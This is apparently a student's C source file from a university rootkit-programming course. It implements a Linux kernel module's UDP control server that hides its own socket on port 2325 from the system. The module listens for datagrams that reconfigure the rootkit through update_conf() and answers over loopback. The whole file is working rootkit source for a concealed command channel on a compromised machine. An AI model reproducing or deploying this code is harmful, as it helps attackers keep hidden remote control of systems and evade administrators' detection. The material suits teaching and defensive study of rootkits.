
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: udp_server.c                                                    */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/netdevice.h>

#include "socket_masking.h"
#include "conf_manager.h"

/*
#include <linux/init.h>
#include <linux/mutex.h>
#include <linux/wait.h>
#include <linux/signal.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/delay.h>
*/


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit udp_server: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define CONF_BUFSIZE 1024
#define DEFAULT_PORT 2325
#define CONNECT_PORT 23
#define INADDR_SEND INADDR_LOOPBACK
#define MODULE_NAME "rootkit"


/* Definition of global variables */
static int show_debug_messages;
static struct kthread_t *kthread = NULL;


/* Declaration of functions */
int udp_server_init(int);
int udp_server_exit(void);

static void ksocket_start(void);
static int ksocket_receive(struct socket *sock, struct sockaddr_in *, unsigned char *, int);
static int ksocket_send(struct socket *sock, struct sockaddr_in *, unsigned char *, int);


/* Definition of data structs */
struct kthread_t {
	struct task_struct *thread;
	struct socket *sock;
	struct sockaddr_in addr;
	struct socket *sock_send;
	struct sockaddr_in addr_send;
	int running;
};


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


int udp_server_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	mask_socket("udp4", DEFAULT_PORT);

	kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
	memset(kthread, 0, sizeof(struct kthread_t));

	/* Start kernel thread */
	kthread->thread = kthread_run((void *) ksocket_start, NULL, MODULE_NAME);
	if (IS_ERR(kthread->thread)) {
		DEBUG_PRINT("unable to start kernel thread");
		kfree(kthread);
		kthread = NULL;
		return -ENOMEM;
	}

	DEBUG_PRINT("initialized");

	return 0;
}


int udp_server_exit(void)
{
	//int err;

	if (kthread->thread == NULL)
		DEBUG_PRINT("no udp server thread to kill");
	/*
	else {
		//mutex_lock(&fs_mutex);
		//stop_kthread(kthread);
		//err = kill_proc(kthread->thread->pid, SIGKILL, 1);
		//mutex_unlock(&fs_mutex);

		//Wait for kernel thread to die
		if (err < 0)
			DEBUG_PRINT("unknown error occured while trying to terminate udp server thread");
		else {
			while (kthread->running == 1)
				msleep(10);
			DEBUG_PRINT("succesfully killed udp server thread");
        }
	}
	*/

	/* Free allocated resources before exit */
	if (kthread->sock != NULL) {
		sock_release(kthread->sock);
		kthread->sock = NULL;
	}

	kfree(kthread);
	kthread = NULL;

	DEBUG_PRINT("exited");

	return 0;
}


static void ksocket_start(void)
{
	unsigned char buf[CONF_BUFSIZE+1];
	int size;

	/* Kernel thread initialization */
	//mutex_lock(&fs_mutex);
	kthread->running = 1;
	current->flags |= PF_NOFREEZE;

	/* Daemonize (take care with signals, after daemonize() they are disabled) */
	/*
	daemonize(MODULE_NAME);
	allow_signal(SIGKILL);
	mutex_unlock(&fs_mutex);
	*/

	/* Create a socket */
	if ((sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock) < 0) ||
			(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock_send) < 0)) {
		DEBUG_PRINT("unable to create a datagram socket");
		goto out;
	}

	memset(&kthread->addr, 0, sizeof(struct sockaddr));
	memset(&kthread->addr_send, 0, sizeof(struct sockaddr));
	kthread->addr.sin_family = AF_INET;
	kthread->addr_send.sin_family = AF_INET;

	kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
	kthread->addr_send.sin_addr.s_addr = htonl(INADDR_SEND);

	kthread->addr.sin_port = htons(DEFAULT_PORT);
	kthread->addr_send.sin_port = htons(CONNECT_PORT);

	if ((kthread->sock->ops->bind(kthread->sock, (struct sockaddr *) &kthread->addr, sizeof(struct sockaddr)) < 0) ||
			(kthread->sock_send->ops->connect(kthread->sock_send, (struct sockaddr *) &kthread->addr_send, sizeof(struct sockaddr), 0) < 0 )) {
		DEBUG_PRINT("unable to bind or connect to socket");
		goto close_and_out;
	}

	printk(KERN_INFO "rootkit udp_server: listening on port %d\n", DEFAULT_PORT);

	/* Main loop */
	while (1) {
		DEBUG_PRINT("waiting for connections");
		memset(&buf, 0, CONF_BUFSIZE+1);
		size = ksocket_receive(kthread->sock, &kthread->addr, buf, CONF_BUFSIZE);

		if (signal_pending(current))
			break;

		if (size < 0)
			printk(KERN_INFO "rootkit udp_server: error getting datagram, sock_recvmsg error = %d\n", size);
		else {
			printk(KERN_INFO "rootkit udp_server: received %d bytes\n", size);
			/* Process data */
			update_conf(buf);

			/* Respond */
			memset(buf, 0, CONF_BUFSIZE+1);
			strcat(buf, "Done...");
			ksocket_send(kthread->sock_send, &kthread->addr_send, buf, strlen(buf));
		}
	}

	close_and_out:
		sock_release(kthread->sock);
		sock_release(kthread->sock_send);
		kthread->sock = NULL;
		kthread->sock_send = NULL;
	out:
		kthread->thread = NULL;
		kthread->running = 0;
}


static int ksocket_receive(struct socket* sock, struct sockaddr_in* addr, unsigned char* buf, int len)
{
	struct iovec iov;
	struct msghdr msg;
	mm_segment_t oldfs;
	int size;

	if (sock->sk == NULL)
		return 0;

	size = 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_flags = 0;
	msg.msg_name = addr;
	msg.msg_namelen = sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	//msg.msg_iov = &iov;
	//msg.msg_iovlen = 1;
	iov_iter_init(&msg.msg_iter, READ, &iov, 1, len);

	oldfs = get_fs();
	set_fs(KERNEL_DS);
	size = sock_recvmsg(sock,&msg,len,msg.msg_flags);
	set_fs(oldfs);

	return size;
}


static int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len)
{
	struct iovec iov;
	struct msghdr msg;
	mm_segment_t oldfs;
	int size;

	if (sock->sk == NULL)
		return 0;

	size = 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_flags = 0;
	msg.msg_name = addr;
	msg.msg_namelen  = sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	//msg.msg_iov = &iov;
	//msg.msg_iovlen = 1;
	iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, len);

	oldfs = get_fs();
	set_fs(KERNEL_DS);
	size = sock_sendmsg(sock,&msg);
	set_fs(oldfs);

	return size;
}

